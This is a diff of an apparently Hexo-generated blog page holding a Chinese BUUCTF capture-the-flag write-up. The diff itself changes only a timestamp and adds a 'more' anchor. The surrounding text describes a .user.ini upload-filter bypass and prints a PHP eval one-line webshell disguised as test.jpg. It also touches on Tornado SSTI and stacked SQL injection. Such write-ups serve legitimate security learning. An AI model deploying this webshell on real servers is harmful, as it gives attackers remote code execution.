@@ -39,7 +39,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/09/15/vMSC63Nt8bnrqKx.png">
 <meta property="og:image" content="https://i.loli.net/2020/09/16/R1lP9QCJOTpxGAb.png">
 <meta property="og:image" content="https://i.loli.net/2020/09/30/3jMRJXl1xnrC5Gg.png">
-<meta property="og:updated_time" content="2020-10-02T04:55:46.673Z">
+<meta property="og:updated_time" content="2020-11-29T06:52:43.391Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUUCTF">
 <meta name="twitter:description" content="checkin​    是一道文件上传题，首先抓包分析一波，发现&amp;lt;?,php,等都不行，直接上传基本凉凉，于是考虑解析漏洞。 ​    发现题目服务端是nginx，htaccess也不行，在网上看到了一个姿势，user.ini构建后门 在这里记录一下用这个姿势的条件 ​    1.上传目录下要有可执行的php文件。 ​    2.服务器使用CGI/FastCGI模式 ​    3.php版本">
@@ -218,6 +218,8 @@
 <p>​    于是上传一句话木马,名为test.jpg</p>
 <p><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;aa&#39;]);&lt;/script&gt;</code></p>
 <p>​    这样我们的文件就会被包含到同目录中的那个index.php中了，接下来的操作就不说了。</p>
+<a id="more"></a><!--more-->
+
 <h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p>​    这道题算是我做过的第一道ssti题目，首先发现提示中的render可以知道该题使用tornado模板写的，参考writeup，发现tornado的配置可以放在handler.settings中于是得到payload: <code></code>得到secret_cookie。</p>
 <h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><p>​    随便注了一下发现基本都被过滤了T_T!<img src="https://i.loli.net/2019/10/10/nqau2sQf315WjHx.png" alt></p>
 <p>​    看了网上的wp，发现这是一道堆叠注入。emmm，这里就不再赘述了，记录一下网上的各种payload</p>
